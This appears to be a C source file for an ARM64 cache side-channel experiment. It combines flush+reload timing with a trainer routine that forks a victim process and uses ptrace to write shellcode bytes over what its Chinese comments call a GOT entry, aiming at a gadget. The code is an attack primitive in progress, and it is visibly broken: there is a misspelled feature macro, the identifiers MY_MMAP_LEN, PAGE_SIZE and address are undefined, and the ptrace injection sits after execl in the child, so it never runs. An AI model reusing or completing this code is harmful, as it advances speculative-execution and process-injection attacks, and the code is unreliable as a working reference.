#define _GUN_SOURCE

#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/shm.h>

char *shm;

int cache_threshold = 100;

char temp;

void error_log(char *reason){
    fprintf(stderr, "%s failed ", reason);
    exit(EXIT_FAILURE);
}

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

static inline uint64_t measure_time(void *addr){
  uint64_t time1,time2,read_data;

  asm volatile(
    "dsb sy \n\t"
    "isb \n\t"
    "mrs %0, PMCCNTR_EL0 \n\t"
    "isb \n\t"
    "ldr %2, [%3] \n\t"
    "dsb ish \n\t"
    "isb \n\t"
    "mrs %1, PMCCNTR_EL0 \n\t"
    "isb \n\t"
    : "=&r"(time1), "=&r"(time2), "=&r"(read_data)
    : "r"(addr)
  );

  return time2 - time1;
}

void init_shm(){
    int shmid;

    shmid = shmget( (key_t)9704, 256*512, 0666|IPC_CREAT );

    if(shmid == -1){
        fprintf(stderr, "shmget failed\n");
        exit(EXIT_FAILURE);
    }

    shm = shmat(shmid, 0, 0);

    if( shm == (void *)-1 ){
        fprintf(stderr, "shmat failed\n");
        exit(EXIT_FAILURE);
    }

    memset(shm, 'x', 256*512);
}

void setcpu(int cpu){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(getpid() , sizeof(mask), &mask);
}

void clear_shm(){
    
}


void trainer(int cpu){
    unsigned addr_inject_target = 0xce8;
    //unsigned addr_gadget_expoit = 0x4005c0;
    char shellcode[] = "\x91\x29\xc0\x00";
    pid_t pid;
    int stat;

    pid = fork();

    printf("the pid: %d", pid);

    if(pid == -1){
        error_log("fork");
    }

    if(pid == 0){//进入子进程
        setcpu(cpu);                                //设置子进程的cpu亲和度
        int res = ptrace(PTRACE_TRACEME, 0, 0, 0);
        if(res == -1){
            error_log("ptrace");
        }

        char *args = {"1","1"};

        int result = execl("victim", args);    //子进程中启动victim

        if(result == 0){
            printf("execl running\n");
        } else {
            printf("execl error");
        }

        int long_size = sizeof(long);

        union u {
            long val;
            char chars[long_size];
        }data;

        memcpy(data.chars, shellcode, long_size);

        waitpid(pid, &stat, 0);                         //捕获子进程发出的SIGTRAP信号，获得子进程的控制权
        ptrace(PTRACE_POKEDATA, pid, addr_inject_target, data.val);     //gadget地址写入got位置
        ptrace(PTRACE_DETACH, pid, 0, 0);                   //调试进程分离，子进程独立运行
    }  

}

int main(){
    setcpu(7);

    char *probe;
    int fd;
    fd = open("/dev/expdev", O_RDWR);
    if(fd < 0){
        perror("Open call failed");
        return -1;
    }
    probe = mmap( NULL, MY_MMAP_LEN * PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (address == MAP_FAILED){
        perror("mmap operation failed");
        return -1;
    }

    //trainer(7);

    init_shm();

    // for(int i = 0; i < 256; i++){
    //     flush(&shm[i*512]);
    // }

    //sleep(10);

    asm volatile ("dsb ish");
    asm volatile ("isb");
    uint64_t time = measure_time(&probe[10*512]);
    asm volatile("dsb ish"); 

    printf("%lu    \n", time);   

    if(time < cache_threshold){
        
        printf("get it\n");
    } else {
        printf("nothing\n");
    }
}

